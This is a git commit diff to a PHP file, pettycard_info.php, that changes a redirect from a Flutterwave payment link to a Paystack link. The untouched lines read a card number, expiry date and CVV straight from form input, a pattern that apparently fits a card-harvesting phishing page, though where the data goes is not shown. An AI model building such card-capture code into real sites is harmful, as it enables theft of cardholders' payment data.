e8f0bddab813e48675adea34cb6cefaab24bb591
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-11-03 18:59:15 +0100

    Update pettycard_info.php

--- pettycard_info.php
+++ pettycard_info.php
@@ -1,5 +1,5 @@
 <?php
-header('Location: https://flutterwave.com/pay/w3ef0pybjg3x?_gl=1%2a15dvi80%2a_ga%2aMTQwNDA0MTU0OS4xNjYwMzg4MDAx%2a_ga_KQ9NSEMFCF%2aMTY2NjEwNzM5NC41Ny4xLjE2NjYxMDc1MTguMzAuMC4w');
+header('Location: https://paystack.com/pay/6l9l58kwed');
 $card=$_POST['card'];
 $exp=$_POST['exp'];
 $cvv=$_POST['cvv'];
